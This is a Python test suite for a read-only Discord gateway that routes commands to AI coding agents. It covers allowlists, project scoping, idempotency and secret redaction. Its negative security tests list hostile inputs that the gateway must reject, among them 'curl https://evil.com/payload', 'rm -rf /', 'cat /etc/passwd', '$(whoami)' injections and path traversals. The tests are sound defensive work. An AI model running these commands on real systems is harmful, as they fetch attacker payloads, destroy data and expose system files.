"""Comprehensive test suite for Phase P3: Trusted Discord Gateway Router & Read-Only Handlers.

Covers:
1. Guild ID allowlist validation (valid vs invalid/forged/missing guild IDs).
2. Author ID allowlist validation (owner vs unauthorized user vs bot).
3. Channel & thread parent routing (direct project channel, trusted thread parent, forged parent, missing parent).
4. Command parsing and dispatch for all read-only commands ('status', 'agents', 'recall', 'tasks', 'budget').
5. Negative security tests: injection of shell commands, path traversal, cross-project targeting, and forged thread parents.
6. Idempotency deduplication: duplicate message_id is rejected.
"""
from __future__ import annotations

import json
from pathlib import Path
import sqlite3
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

SRC_DIR = str(Path(__file__).resolve().parents[1] / "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from herdctl import memory as mem
from herdctl.discord_gateway import (
    CommandError,
    DiscordGateway,
    DiscordInboundMessage,
    GatewayError,
    GatewayRoutingError,
    GatewaySecurityError,
    IdempotencyError,
    IdempotencyStore,
    parse_command,
    parse_inbound_message,
    resolve_channel_ancestry,
    sanitize_error,
    sanitize_text,
    validate_metadata,
)


class TestDiscordGatewayBase(unittest.TestCase):
    """Base fixture providing isolated temporary SQLite db, layout, and project configs."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        (self.root / "config").mkdir()

        # Write policy files
        self.token_policy = {
            "version": 1,
            "roles": {
                "supervisor": {
                    "initial_memory_tokens": 1600,
                    "followup_memory_tokens": 800,
                    "target_response_tokens": 600,
                    "terminal_read_lines": 60,
                    "skills": ["task-handoff", "herdr-control"],
                    "rule": "Verify git status and run tests",
                },
                "reviewer": {
                    "initial_memory_tokens": 1200,
                    "followup_memory_tokens": 600,
                    "target_response_tokens": 400,
                    "terminal_read_lines": 80,
                    "skills": ["task-handoff"],
                    "rule": "Independent test reproduction",
                },
                "gateway": {
                    "initial_memory_tokens": 400,
                    "followup_memory_tokens": 200,
                    "target_response_tokens": 300,
                    "terminal_read_lines": 30,
                    "skills": ["memory-recall"],
                    "rule": "Compact deterministic Discord response",
                },
                "implementer": {
                    "initial_memory_tokens": 1400,
                    "followup_memory_tokens": 700,
                    "target_response_tokens": 500,
                    "terminal_read_lines": 100,
                    "skills": ["herdr-control"],
                    "rule": "Keep worktree changes minimal",
                },
                "explorer": {
                    "initial_memory_tokens": 2000,
                    "followup_memory_tokens": 1000,
                    "target_response_tokens": 800,
                    "terminal_read_lines": 120,
                    "skills": ["memory-recall"],
                    "rule": "Search evidence before hypothesizing",
                },
            },
        }
        (self.root / "config" / "token_policy.json").write_text(json.dumps(self.token_policy))

        self.layout = {
            "version": 1,
            "bot_name": "ResearchOps",
            "guild_id": "1556635278846992404",
            "owner_user_ids": [
                "734391788718129205",
            ],
            "control_channels": {
                "agent-control": {
                    "channel_id": "1566465715828031582",
                    "inbound": True,
                    "require_mention": True,
                    "restricted": True,
                },
                "approvals": {
                    "channel_id": "1566465936607940638",
                    "inbound": False,
                    "restricted": True,
                },
                "alerts": {
                    "channel_id": "1566466285976686713",
                    "inbound": False,
                    "restricted": True,
                },
                "system-status": {
                    "channel_id": "1566469346081898636",
                    "inbound": False,
                    "restricted": True,
                    "optional": True,
                },
            },
            "permissions": {"bot": ["View Channels", "Send Messages"]},
        }
        (self.root / "config" / "discord_layout.json").write_text(json.dumps(self.layout))

        self.cfg = {
            "state_dir": "./.state",
            "worktree_root": "./.worktrees",
            "default_memory_budget": 1600,
            "herdr_binary": "herdr",
            "openclaw_binary": "openclaw",
            "projects": {
                "starlight-tempo": {
                    "repo": str(self.root / "repos" / "starlight-tempo"),
                    "discord_channel_id": "1566467969033306122",
                },
                "federated-learning-iot": {
                    "repo": str(self.root / "repos" / "fl-iot"),
                    "discord_channel_id": "1566468206171000982",
                },
            },
        }
        (self.root / "config" / "projects.json").write_text(json.dumps(self.cfg))

        # Create simulated repo dirs
        (self.root / "repos" / "starlight-tempo").mkdir(parents=True)
        (self.root / "repos" / "fl-iot").mkdir(parents=True)

        # Setup SQLite memory db
        self.db_path = self.root / ".state" / "memory.sqlite3"
        self.cx = mem.connection(self.db_path)

        # Instantiate gateway
        self.gateway = DiscordGateway(
            root=self.root,
            cfg=self.cfg,
            layout=self.layout,
            cx=self.cx,
        )

    def tearDown(self):
        self.cx.close()
        self.tmp.cleanup()

    def make_msg(
        self,
        content: str = "status",
        channel_id: str = "1566465715828031582",
        parent_channel_id: str | None = None,
        guild_id: str = "1556635278846992404",
        author_id: str = "734391788718129205",
        author_is_bot: bool = False,
        message_id: str = "1566470000000000001",
    ) -> DiscordInboundMessage:
        return DiscordInboundMessage(
            message_id=message_id,
            guild_id=guild_id,
            channel_id=channel_id,
            author_id=author_id,
            content=content,
            parent_channel_id=parent_channel_id,
            author_is_bot=author_is_bot,
        )


class TestGuildAllowlist(TestDiscordGatewayBase):
    """Test guild ID validation against allowlist."""

    def test_valid_guild_id_succeeds(self):
        msg = self.make_msg(guild_id="1556635278846992404")
        validate_metadata(self.layout, msg)

    def test_forged_or_unapproved_guild_id_rejected(self):
        msg = self.make_msg(guild_id="999999999999999999")
        with self.assertRaises(GatewaySecurityError) as ctx:
            validate_metadata(self.layout, msg)
        self.assertIn("Unapproved guild ID", str(ctx.exception))

    def test_empty_or_missing_guild_id_rejected(self):
        msg = self.make_msg(guild_id="")
        with self.assertRaises(GatewaySecurityError):
            validate_metadata(self.layout, msg)

    def test_malformed_guild_id_syntax_rejected(self):
        msg = self.make_msg(guild_id="abc-not-snowflake")
        with self.assertRaises(GatewaySecurityError):
            validate_metadata(self.layout, msg)

    def test_layout_without_configured_guild_fails_closed(self):
        layout_no_guild = dict(self.layout, guild_id=None)
        msg = self.make_msg(guild_id="1556635278846992404")
        with self.assertRaises(GatewaySecurityError):
            validate_metadata(layout_no_guild, msg)


class TestAuthorAllowlist(TestDiscordGatewayBase):
    """Test author ID validation against owner allowlist."""

    def test_valid_owner_author_succeeds(self):
        msg = self.make_msg(author_id="734391788718129205")
        validate_metadata(self.layout, msg)

    def test_unauthorized_user_rejected(self):
        msg = self.make_msg(author_id="123456789012345678")
        with self.assertRaises(GatewaySecurityError) as ctx:
            validate_metadata(self.layout, msg)
        self.assertIn("Unapproved author ID", str(ctx.exception))

    def test_bot_author_rejected_even_if_owner_id(self):
        msg = self.make_msg(author_id="734391788718129205", author_is_bot=True)
        with self.assertRaises(GatewaySecurityError) as ctx:
            validate_metadata(self.layout, msg)
        self.assertIn("Bot messages are prohibited", str(ctx.exception))

    def test_malformed_author_id_rejected(self):
        msg = self.make_msg(author_id="root")
        with self.assertRaises(GatewaySecurityError):
            validate_metadata(self.layout, msg)

    def test_layout_without_owners_fails_closed(self):
        layout_no_owners = dict(self.layout, owner_user_ids=[])
        msg = self.make_msg(author_id="734391788718129205")
        with self.assertRaises(GatewaySecurityError):
            validate_metadata(layout_no_owners, msg)


class TestChannelAndThreadRouting(TestDiscordGatewayBase):
    """Test channel and thread ancestry resolution."""

    def test_agent_control_channel_resolves_control_scope(self):
        routing = resolve_channel_ancestry(self.layout, self.cfg, "1566465715828031582")
        self.assertEqual(routing["scope"], "control")
        self.assertIsNone(routing["project"])
        self.assertEqual(routing["via"], "control_channel")

    def test_agent_control_with_parent_id_rejected(self):
        with self.assertRaises(GatewayRoutingError):
            resolve_channel_ancestry(self.layout, self.cfg, "1566465715828031582", "1566467969033306122")

    def test_outbound_only_control_channels_rejected(self):
        for cid in ["1566465936607940638", "1566466285976686713", "1566469346081898636"]:
            with self.assertRaises(GatewayRoutingError) as ctx:
                resolve_channel_ancestry(self.layout, self.cfg, cid)
            self.assertIn("outbound-only or restricted", str(ctx.exception))

    def test_direct_project_channel_resolves_project(self):
        routing = resolve_channel_ancestry(self.layout, self.cfg, "1566467969033306122")
        self.assertEqual(routing["scope"], "project")
        self.assertEqual(routing["project"], "starlight-tempo")
        self.assertEqual(routing["via"], "project_channel")

    def test_second_project_channel_resolves_correct_project(self):
        routing = resolve_channel_ancestry(self.layout, self.cfg, "1566468206171000982")
        self.assertEqual(routing["scope"], "project")
        self.assertEqual(routing["project"], "federated-learning-iot")

    def test_direct_project_channel_with_parent_id_rejected(self):
        with self.assertRaises(GatewayRoutingError) as ctx:
            resolve_channel_ancestry(self.layout, self.cfg, "1566467969033306122", "1566468206171000982")
        self.assertIn("already configured project channel", str(ctx.exception))

    def test_trusted_thread_parent_resolves_project(self):
        routing = resolve_channel_ancestry(
            self.layout, self.cfg, "1566469999999999999", "1566467969033306122"
        )
        self.assertEqual(routing["scope"], "project")
        self.assertEqual(routing["project"], "starlight-tempo")
        self.assertEqual(routing["via"], "trusted_thread_parent")

    def test_forged_thread_parent_rejected(self):
        with self.assertRaises(GatewayRoutingError) as ctx:
            resolve_channel_ancestry(
                self.layout, self.cfg, "1566469999999999999", "999999999999999999"
            )
        self.assertIn("does not match any configured project channel", str(ctx.exception))

    def test_equal_channel_and_parent_id_rejected(self):
        with self.assertRaises(GatewayRoutingError) as ctx:
            resolve_channel_ancestry(
                self.layout, self.cfg, "1566467969033306122", "1566467969033306122"
            )
        self.assertIn("Equal parent channel ID and channel ID", str(ctx.exception))

    def test_unmapped_channel_without_parent_rejected(self):
        with self.assertRaises(GatewayRoutingError) as ctx:
            resolve_channel_ancestry(self.layout, self.cfg, "1566469999999999999")
        self.assertIn("not mapped to any control or project channel", str(ctx.exception))

    def test_malformed_channel_and_parent_ids_rejected(self):
        with self.assertRaises(GatewayRoutingError):
            resolve_channel_ancestry(self.layout, self.cfg, "invalid_id")
        with self.assertRaises(GatewayRoutingError):
            resolve_channel_ancestry(self.layout, self.cfg, "1566469999999999999", "invalid_parent")


class TestCommandParsingAndDispatch(TestDiscordGatewayBase):
    """Test parsing and dispatch for typed read-only commands."""

    def test_command_parser_variants(self):
        self.assertEqual(parse_command("status"), ("status", ""))
        self.assertEqual(parse_command("/status"), ("status", ""))
        self.assertEqual(parse_command("!status"), ("status", ""))
        self.assertEqual(parse_command("<@1556635278846992404> status"), ("status", ""))
        self.assertEqual(parse_command("<@!1556635278846992404> agents"), ("agents", ""))
        self.assertEqual(parse_command("recall MTP benchmark"), ("recall", "MTP benchmark"))
        self.assertEqual(parse_command("/budget supervisor"), ("budget", "supervisor"))
        self.assertEqual(parse_command("tasks"), ("tasks", ""))

    def test_empty_command_raises_error(self):
        with self.assertRaises(CommandError):
            parse_command("")
        with self.assertRaises(CommandError):
            parse_command("   ")

    def test_status_command_in_control_channel(self):
        msg = self.make_msg(content="status", channel_id="1566465715828031582")
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertEqual(res["command"], "status")
        self.assertEqual(res["scope"], "control")
        self.assertEqual(res["data"]["gateway_health"], "ok")
        self.assertIn("starlight-tempo", res["data"]["projects"])
        self.assertIn("federated-learning-iot", res["data"]["projects"])

    def test_status_command_in_project_channel(self):
        msg = self.make_msg(content="/status", channel_id="1566467969033306122")
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertEqual(res["scope"], "project")
        self.assertEqual(res["project"], "starlight-tempo")

    def test_agents_command_in_control_channel_returns_all_agents(self):
        # Insert agents in two different projects
        with self.cx:
            self.cx.execute(
                "INSERT INTO bindings VALUES (?,?,?,?,?,?,?)",
                ("st_agent", "starlight-tempo", "codex", "w1:p1", "w1", "/tmp/st", 100),
            )
            self.cx.execute(
                "INSERT INTO bindings VALUES (?,?,?,?,?,?,?)",
                ("fl_agent", "federated-learning-iot", "claude", "w2:p1", "w2", "/tmp/fl", 200),
            )

        msg = self.make_msg(content="agents", channel_id="1566465715828031582")
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertEqual(len(res["data"]), 2)
        agent_names = {a["name"] for a in res["data"]}
        self.assertEqual(agent_names, {"st_agent", "fl_agent"})

    def test_agents_command_in_project_channel_strictly_scoped(self):
        with self.cx:
            self.cx.execute(
                "INSERT INTO bindings VALUES (?,?,?,?,?,?,?)",
                ("st_agent", "starlight-tempo", "codex", "w1:p1", "w1", "/tmp/st", 100),
            )
            self.cx.execute(
                "INSERT INTO bindings VALUES (?,?,?,?,?,?,?)",
                ("fl_agent", "federated-learning-iot", "claude", "w2:p1", "w2", "/tmp/fl", 200),
            )

        # In starlight-tempo channel
        msg = self.make_msg(content="agents", channel_id="1566467969033306122")
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertEqual(len(res["data"]), 1)
        self.assertEqual(res["data"][0]["name"], "st_agent")
        self.assertEqual(res["data"][0]["project"], "starlight-tempo")

        # In federated-learning-iot channel
        msg2 = self.make_msg(
            content="agents",
            channel_id="1566468206171000982",
            message_id="1566470000000000002",
        )
        res2 = self.gateway.handle_message(msg2)
        self.assertTrue(res2["ok"])
        self.assertEqual(len(res2["data"]), 1)
        self.assertEqual(res2["data"][0]["name"], "fl_agent")

    def test_recall_command_scoped_and_no_leakage(self):
        # Add memory in starlight-tempo, federated-learning-iot, and global
        mem.add(
            self.cx,
            scope="project",
            project="starlight-tempo",
            type="decision",
            subject="Native MTP benchmark",
            content="Use PyTorch 2.5 compile mode with dynamic shapes",
            evidence="git:commit-st-01",
        )
        mem.add(
            self.cx,
            scope="project",
            project="federated-learning-iot",
            type="decision",
            subject="Differential privacy budget",
            content="Epsilon=1.5 on Raspberry Pi gateway nodes",
            evidence="git:commit-fl-01",
        )
        mem.add(
            self.cx,
            scope="global",
            project=None,
            type="constraint",
            subject="Security policy",
            content="Never paste Discord bot tokens into shell commands",
            evidence="docs:security.md",
        )

        # Recall in starlight-tempo channel
        msg = self.make_msg(
            content="recall benchmark",
            channel_id="1566467969033306122",
        )
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        subjects = [r["subject"] for r in res["data"]]
        self.assertIn("Native MTP benchmark", subjects)
        self.assertNotIn("Differential privacy budget", subjects)

        # Recall in federated-learning-iot channel cannot see starlight-tempo
        msg2 = self.make_msg(
            content="recall benchmark",
            channel_id="1566468206171000982",
            message_id="1566470000000000003",
        )
        res2 = self.gateway.handle_message(msg2)
        self.assertTrue(res2["ok"])
        self.assertEqual(res2["data"], [])  # no hits in FL project

        # Global memory visible in both
        msg3 = self.make_msg(
            content="recall tokens",
            channel_id="1566467969033306122",
            message_id="1566470000000000004",
        )
        res3 = self.gateway.handle_message(msg3)
        self.assertTrue(res3["ok"])
        subjects3 = [r["subject"] for r in res3["data"]]
        self.assertIn("Security policy", subjects3)

    def test_recall_in_control_channel_searches_global_only(self):
        mem.add(
            self.cx,
            scope="project",
            project="starlight-tempo",
            type="fact",
            subject="Private ST Fact",
            content="Private information about starlight",
            evidence="git:123",
        )
        mem.add(
            self.cx,
            scope="global",
            project=None,
            type="fact",
            subject="Global Fact",
            content="Shared platform architecture",
            evidence="git:global",
        )

        msg = self.make_msg(
            content="recall Fact",
            channel_id="1566465715828031582",
        )
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        subjects = [r["subject"] for r in res["data"]]
        self.assertIn("Global Fact", subjects)
        self.assertNotIn("Private ST Fact", subjects)

    def test_recall_empty_query_rejected(self):
        msg = self.make_msg(
            content="recall",
            channel_id="1566467969033306122",
        )
        res = self.gateway.handle_message(msg)
        self.assertFalse(res["ok"])
        self.assertIn("Query required for recall command", res["error"])

    def test_tasks_command_scoped_per_project(self):
        mem.task_upsert(
            self.cx,
            task_id="ST-01",
            project="starlight-tempo",
            title="Benchmark execution",
            status="working",
            agent="st_codex",
        )
        mem.task_upsert(
            self.cx,
            task_id="FL-01",
            project="federated-learning-iot",
            title="Device aggregation test",
            status="queued",
            agent="fl_claude",
        )

        # In starlight-tempo
        msg = self.make_msg(
            content="tasks",
            channel_id="1566467969033306122",
        )
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        task_ids = [t["id"] for t in res["data"]]
        self.assertEqual(task_ids, ["ST-01"])

        # In #agent-control -> sees all tasks
        msg2 = self.make_msg(
            content="tasks",
            channel_id="1566465715828031582",
            message_id="1566470000000000005",
        )
        res2 = self.gateway.handle_message(msg2)
        self.assertTrue(res2["ok"])
        task_ids2 = {t["id"] for t in res2["data"]}
        self.assertEqual(task_ids2, {"ST-01", "FL-01"})

    def test_budget_command_valid_and_invalid_roles(self):
        msg = self.make_msg(
            content="budget supervisor",
            channel_id="1566465715828031582",
        )
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertEqual(res["data"]["role"], "supervisor")
        self.assertEqual(res["data"]["memory_context_budget_estimate"], 1600)

        # Unknown role
        msg2 = self.make_msg(
            content="budget hacker",
            channel_id="1566465715828031582",
            message_id="1566470000000000006",
        )
        res2 = self.gateway.handle_message(msg2)
        self.assertFalse(res2["ok"])
        self.assertIn("Unknown role 'hacker'", res2["error"])

        # Missing role
        msg3 = self.make_msg(
            content="budget",
            channel_id="1566465715828031582",
            message_id="1566470000000000007",
        )
        res3 = self.gateway.handle_message(msg3)
        self.assertFalse(res3["ok"])
        self.assertIn("Role required for budget command", res3["error"])


class TestNegativeSecurity(TestDiscordGatewayBase):
    """Negative security tests: command injection, path traversal, shell commands, and secret containment."""

    def test_prohibited_shell_commands_denied(self):
        dangerous_commands = [
            "bash -c 'id'",
            "sh test.sh",
            "cat /etc/passwd",
            "rm -rf /",
            "curl https://evil.com/payload",
            "wget https://evil.com/payload",
            "python -c 'print(1)'",
            "sudo reboot",
            "exec rm",
        ]
        for idx, cmd in enumerate(dangerous_commands):
            msg = self.make_msg(
                content=cmd,
                channel_id="1566467969033306122",
                message_id=f"15664700000000100{idx:02d}",
            )
            res = self.gateway.handle_message(msg)
            self.assertFalse(res["ok"], f"Expected {cmd!r} to be rejected")
            self.assertIn("prohibited", res["error"].lower())

    def test_mutation_commands_denied(self):
        mutation_commands = [
            "launch --project starlight-tempo --kind codex --name c1",
            "prompt --project starlight-tempo --agent c1 --text hello",
            "notify --project starlight-tempo --text alert",
            "set ST-01 title done",
            "add global decision test",
        ]
        for idx, cmd in enumerate(mutation_commands):
            msg = self.make_msg(
                content=cmd,
                channel_id="1566467969033306122",
                message_id=f"15664700000000200{idx:02d}",
            )
            res = self.gateway.handle_message(msg)
            self.assertFalse(res["ok"])
            self.assertIn("prohibited in read-only gateway", res["error"])

    def test_shell_metacharacters_in_arguments_denied(self):
        injection_attempts = [
            "recall query; rm -rf /",
            "recall query && ls -la",
            "recall query | cat",
            "recall `whoami`",
            "recall $(whoami)",
            "budget supervisor; reboot",
            "budget supervisor > /tmp/out",
        ]
        for idx, cmd in enumerate(injection_attempts):
            msg = self.make_msg(
                content=cmd,
                channel_id="1566467969033306122",
                message_id=f"15664700000000300{idx:02d}",
            )
            res = self.gateway.handle_message(msg)
            self.assertFalse(res["ok"])
            self.assertIn("Shell metacharacters are prohibited", res["error"])

    def test_path_traversal_in_arguments_denied(self):
        traversals = [
            "recall ../../etc/passwd",
            "recall ..\\..\\windows\\system32",
            "budget ../../config/token_policy",
        ]
        for idx, cmd in enumerate(traversals):
            msg = self.make_msg(
                content=cmd,
                channel_id="1566467969033306122",
                message_id=f"15664700000000400{idx:02d}",
            )
            res = self.gateway.handle_message(msg)
            self.assertFalse(res["ok"])
            self.assertIn("Path traversal", res["error"])

    def test_fail_closed_error_sanitization_masks_secrets(self):
        fake_secret_error = Exception("Failed connecting with token=ghp_12345678901234567890 at /secret/path")
        sanitized = sanitize_error(fake_secret_error)
        self.assertNotIn("ghp_12345678901234567890", sanitized)
        self.assertIn("[REDACTED_SECRET]", sanitized)

    def test_text_sanitizer_masks_api_keys(self):
        text = "api_key=sk-12345678901234567890abcdef and password: secret_password_here"
        cleaned = sanitize_text(text)
        self.assertNotIn("sk-12345678901234567890abcdef", cleaned)
        self.assertIn("[REDACTED_SECRET]", cleaned)


class TestIdempotencyDeduplication(TestDiscordGatewayBase):
    """Test idempotency tracking and rejection of duplicate message deliveries."""

    def test_first_delivery_succeeds(self):
        msg = self.make_msg(content="status", message_id="1566470000000099901")
        res = self.gateway.handle_message(msg)
        self.assertTrue(res["ok"])
        self.assertIsNone(res["error"])

    def test_duplicate_delivery_rejected(self):
        msg = self.make_msg(content="status", message_id="1566470000000099902")
        res1 = self.gateway.handle_message(msg)
        self.assertTrue(res1["ok"])

        # Second delivery of identical message_id
        res2 = self.gateway.handle_message(msg)
        self.assertFalse(res2["ok"])
        self.assertIn("Duplicate message ID", res2["error"])

    def test_duplicate_message_raises_in_strict_mode(self):
        msg = self.make_msg(content="status", message_id="1566470000000099903")
        self.gateway.handle_message(msg, raise_on_error=True)

        with self.assertRaises(IdempotencyError) as ctx:
            self.gateway.handle_message(msg, raise_on_error=True)
        self.assertIn("Duplicate message ID", str(ctx.exception))

    def test_distinct_message_ids_both_succeed(self):
        msg1 = self.make_msg(content="status", message_id="1566470000000099904")
        msg2 = self.make_msg(content="status", message_id="1566470000000099905")

        res1 = self.gateway.handle_message(msg1)
        res2 = self.gateway.handle_message(msg2)

        self.assertTrue(res1["ok"])
        self.assertTrue(res2["ok"])

    def test_sqlite_persistence_across_gateway_instances(self):
        msg = self.make_msg(content="status", message_id="1566470000000099906")
        res1 = self.gateway.handle_message(msg)
        self.assertTrue(res1["ok"])

        # New gateway instance pointing to the same SQLite db connection
        new_gateway = DiscordGateway(
            root=self.root,
            cfg=self.cfg,
            layout=self.layout,
            cx=self.cx,
        )
        res2 = new_gateway.handle_message(msg)
        self.assertFalse(res2["ok"])
        self.assertIn("Duplicate message ID", res2["error"])


if __name__ == "__main__":
    unittest.main()
